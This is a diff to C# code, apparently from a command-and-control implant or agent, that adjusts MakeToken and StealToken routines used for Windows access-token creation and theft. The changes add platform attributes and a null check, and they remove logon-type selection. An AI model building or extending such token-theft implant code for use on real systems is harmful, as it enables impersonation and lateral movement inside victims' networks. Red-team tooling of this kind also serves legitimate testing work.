@@ -63,22 +63,16 @@ namespace Agent
                     break;
             }
         }
+        [System.Runtime.Versioning.SupportedOSPlatform("windows")]
         private void MakeToken(ServerJob job)
         {
             CreateToken tokenOptions = JsonSerializer.Deserialize(job.task.parameters, CreateTokenJsonContext.Default.CreateToken);
+            if(tokenOptions is null){
+                return;
+            }
             SafeAccessTokenHandle hToken = new SafeAccessTokenHandle();
             try
             {
-                Native.LogonType logonType;
-                if (tokenOptions.netOnly)
-                {
-                    logonType = Native.LogonType.LOGON32_LOGON_NETWORK;
-                }
-                else
-                {
-                    logonType = Native.LogonType.LOGON32_LOGON_INTERACTIVE;
-                }
-
                 //object[] logonParams = new object[] { tokenOptions.username, tokenOptions.domain, tokenOptions.password, logonType, Native.LogonProvider.LOGON32_PROVIDER_DEFAULT, hToken, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero };
                 //bool result = Generic.InvokeFunc<bool>(luFunc, typeof(logonUsrDelegate), ref logonParams);
 
@@ -115,7 +109,7 @@ namespace Agent
                 }.ToJson());
             }
         }
-
+        [System.Runtime.Versioning.SupportedOSPlatform("windows")]
         private void StealToken(ServerJob job, Dictionary<string, string> args)
         {
             if (!args.ContainsKey("pid"))
